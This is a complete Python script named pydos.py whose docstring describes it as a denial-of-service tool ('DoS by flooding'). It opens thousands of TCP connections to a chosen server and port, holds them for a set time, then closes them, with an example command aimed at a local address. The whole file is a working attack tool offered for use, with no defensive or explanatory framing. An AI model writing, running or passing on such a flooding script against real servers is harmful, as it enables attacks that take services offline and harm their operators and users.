#!/usr/bin/env python3
"""
DoS by flooding

File name: pydos.py
Author: Konstantinos Christos Liosis
Date created: 21/6/2018
Python Version: 3.6.0

Example execution:
$ python pydos.py -server 192.168.1.254 -port 80 -sleep 1000 -conns 10000
"""

# modules import
import socket
import argparse
from time import sleep
import configparser

# parameters loading
params = configparser.ConfigParser()
params.read('params.ini')

def create_conn(server, port, conn):
    s = socket.socket()
    try:
        s.connect((server, port))
        print('Connection no. ', str(conn), ' opened')

    except Exception as e:
        print(e)
        s = None

    return s


def main():
    parser = argparse.ArgumentParser()

    # server
    parser.add_argument('-server', help='Server')
    # port
    parser.add_argument('-port', help='Port')
    # sleep
    parser.add_argument('-sleep', help='Sleep time in seconds')
    # number of connections
    parser.add_argument('-conns', help='Number of connections')

    args = parser.parse_args()

    sleep_time = int(params['DoS']['sleep']) if not args.sleep else int(args.sleep)
    conns = int(params['DoS']['conns']) if not args.conns else int(args.conns)

    if not (args.server and args.port):
        print('You must define server address and port')
        server = input('Server: ')
        port = int(input('Port: '))

    else:
        server = args.server
        port = int(args.port)

    sockets = []
    for conn in range(conns):
        sockets.append(create_conn(server, port, conn))
        if not sockets[-1]:
            del sockets[-1]
            break

    if len(sockets) < conns:
        print(str(len(sockets)), ' sockets created before connection timeout occurred')

    # wait sleep_time and them close all conns
    sleep(sleep_time)
    print('Closing connections...')

    # close connections
    for socket in sockets:
        socket.close()


if __name__ == "__main__":
    main()

